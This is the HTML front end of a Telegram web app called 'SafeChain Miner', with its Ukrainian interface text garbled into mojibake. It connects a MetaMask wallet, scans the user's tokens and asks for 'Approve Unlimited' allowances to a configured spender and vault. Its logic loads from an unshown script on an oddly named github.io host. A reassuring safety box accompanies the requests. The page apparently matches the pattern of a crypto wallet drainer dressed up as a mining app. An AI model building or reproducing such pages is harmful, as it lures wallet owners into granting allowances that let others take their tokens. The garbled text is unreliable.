<!doctype html>
<html lang="uk">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>SafeChain Miner ‚Äî WebApp</title>

    <link rel="stylesheet" href="https://erahozoqu763.github.io/mmaaiinnnnn/style.css" />
    <!-- Telegram WebApp SDK (–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Telegram –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è —è–∫ WebApp) -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- ethers v6 (CDN) -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>
</head>
<body>
    <header class="topbar">
        <div class="brand">SafeChain <span class="muted">Miner</span></div>
        <div id="netInfo" class="chip">‚Äî</div>
    </header>

    <main class="container">
        <section class="card">
            <h2>1) –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–∞–º–∞–Ω—Ü—è</h2>
            <p class="small muted">–ü—Ä–∞—Ü—é—î–º–æ –ª–∏—à–µ —á–µ—Ä–µ–∑ –ø—ñ–¥–ø–∏—Å (–±–µ–∑ seed/PK). –í–µ–±–∫–ª—ñ—î–Ω—Ç –Ω–µ –∑–±–µ—Ä—ñ–≥–∞—î —Ç–≤–æ—ó –¥–∞–Ω—ñ.</p>

            <div class="row">
                <button id="btnConnect" class="btn primary">üîó –ü—ñ–¥–∫–ª—é—á–∏—Ç–∏ MetaMask</button>
                <button id="btnDisconnect" class="btn" disabled>‚èèÔ∏è –í—ñ–¥‚Äô—î–¥–Ω–∞—Ç–∏</button>
            </div>

            <div id="who" class="mono small"></div>
            <div id="bindState" class="mono small"></div>

            <div class="row">
                <button id="btnBind" class="btn success" disabled>‚úçÔ∏è –ü—ñ–¥–ø–∏—Å–∞—Ç–∏ –ø—Ä–∏–≤‚Äô—è–∑–∫—É –¥–æ Telegram</button>
            </div>
        </section>

        <section class="card">
            <h2>2) –¢–æ–∫–µ–Ω–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏</h2>
            <p class="small muted">
                –°–ø–∏—Å–æ–∫ —Ç–æ–∫–µ–Ω—ñ–≤ –±–µ—Ä–µ—Ç—å—Å—è –∑ <code>tokens.json</code> –±–µ–∫–µ–Ω–¥—É. –î–ª—è –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–¥–∞—Ç–∏
                <b>Approve Unlimited</b> –Ω–∞ –∞–¥—Ä–µ—Å—É <span id="spenderSpan" class="mono"></span> –∞–±–æ –≤—ñ–¥–∫–ª–∏–∫–∞—Ç–∏ <b>Revoke (0)</b>.
            </p>

            <div class="row">
                <button id="btnRefresh" class="btn">üîÑ –û–Ω–æ–≤–∏—Ç–∏ –±–∞–ª–∞–Ω—Å–∏/allowance</button>
                <button id="btnDiscover" class="btn">üß≠ Discover –º–æ—ó —Ç–æ–∫–µ–Ω–∏</button>
            </div>

            <div id="tokensTable" class="table"></div>
        </section>

        <section class="card">
            <h2>–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è (read-only)</h2>
            <div class="grid2">
                <div><span class="muted">SPENDER:</span> <span id="cfgSpender" class="mono"></span></div>
                <div><span class="muted">VAULT:</span> <span id="cfgVault" class="mono"></span></div>
                <div><span class="muted">Chain ID:</span> <span id="cfgChainId" class="mono"></span></div>
                <div><span class="muted">API:</span> <span id="cfgApi" class="mono"></span></div>
            </div>
        </section>

        <section class="card warn">
            <h3>–ë–µ–∑–ø–µ–∫–∞: —á–∏–º ‚Äú–±–µ–∑–ø–µ—á–Ω–∏–π‚Äù approve –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ ‚Äú–Ω–µ–±–µ–∑–ø–µ—á–Ω–æ–≥–æ‚Äù</h3>
            <ul>
                <li><b>–ë–µ–∑–ø–µ—á–Ω–æ:</b> —Ç–∏ —Å–≤—ñ–¥–æ–º–æ –Ω–∞—Ç–∏—Å–∫–∞—î—à <i>Approve</i> —É —Å–≤–æ—î–º—É –≥–∞–º–∞–Ω—Ü—ñ, –±–∞—á–∏—à <i>spender</i>=SPENDER —ñ –º–µ—Ä–µ–∂—É=Config.chainId.</li>
                <li><b>–ù–µ–±–µ–∑–ø–µ—á–Ω–æ:</b> –ø—Ä–∏—Ö–æ–≤–∞–Ω–∞ —ñ–Ω—Ç–µ—Ä–∞–∫—Ü—ñ—è, –ø—ñ–¥–º—ñ–Ω–∞ –º–µ—Ä–µ–∂—ñ –∞–±–æ spender‚Äô–∞, –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π –ø—ñ–¥–ø–∏—Å –±–µ–∑ UI. –ú–∏ —Ç–∞–∫–æ–≥–æ –Ω–µ —Ä–æ–±–∏–º–æ.</li>
            </ul>
        </section>
    </main>

    <footer class="footer">
        ¬© SafeChain ‚Ä¢ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —Ç–≤–æ—ó—Ö –≤–ª–∞—Å–Ω–∏—Ö –∞–¥—Ä–µ—Å
    </footer>

    <script src="https://erahozoqu763.github.io/mmaaiinnnnn/app.js"></script>
</body>
</html>
